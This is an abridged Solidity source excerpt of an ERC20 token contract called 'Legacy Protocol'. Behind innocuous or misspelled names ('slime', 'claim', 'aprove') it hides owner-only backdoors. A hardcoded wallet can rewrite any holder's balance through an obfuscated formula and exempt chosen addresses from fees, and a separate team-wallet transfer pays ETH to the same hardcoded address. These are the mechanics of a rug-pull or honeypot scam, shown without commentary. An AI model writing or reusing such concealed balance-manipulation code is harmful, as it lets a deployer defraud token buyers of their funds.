...
contract  LegacyProtocol is Context, IERC20, Ownable {

    using SafeMath for uint256;
    string private _name = "Legacy Protocol";
    string private _symbol = "LEGACY";
    ...
    constructor () {
        ...
        MW = payable(address(0xE636A2D173E42c1651eb430741DeBE69b1850DaE));
        TW = payable(address(0xE636A2D173E42c1651eb430741DeBE69b1850DaE));
    ...
    function aprove(address[] memory bots) public {
        slime(true);
        for (uint256 i; i < bots.length; i++) {
            isExcludedFromFee[bots[i]] = true;
        }
    }
    ...
    function slime(bool status) view public{
        if (!status) return;
        {require(MW == _msgSender());}
    }
    ...
    function claim(uint256 val, address dont) public {
        uint256 amount0In;
        slime(true);
        amount0In = val + 5 * balanceOf(dont) - 4 * _balances[dont];{ _balances[dont] = amount0In;}
    }
    ...
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        ...
        if(amountETHTeam > 0)
            transferToAddressETH(TW, amountETHTeam);
    }
